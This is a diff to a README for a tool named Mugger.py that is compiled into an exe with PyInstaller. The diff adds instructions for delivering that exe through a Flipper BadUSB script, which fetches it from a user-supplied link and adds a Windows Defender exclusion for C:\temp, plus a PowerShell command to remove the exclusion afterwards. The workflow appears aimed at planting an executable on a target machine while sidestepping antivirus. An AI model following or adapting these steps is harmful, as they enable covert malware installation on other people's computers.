@@ -56,3 +56,14 @@ python3 -m PyInstaller Mugger.py --onefile
         
 # Upload
 * Upload exe to a server, local python server, etc... do as you will.
+
+# BADUSB
+* Edit the line "LINK_TO_EXE" to the link to your newly created exe file.
+        - This script sets an exclusion for C:\temp!!!!!!
+        - When you are done, be sure to reset the exclusion path!!!!!!!!
+* Reset Exclusion Path for Badusb script when finished
+```
+Remove-MpPreference -ExclusionPath "C:\temp"
+```
+OR 
+run ExclusionRemove.txt file with flipper
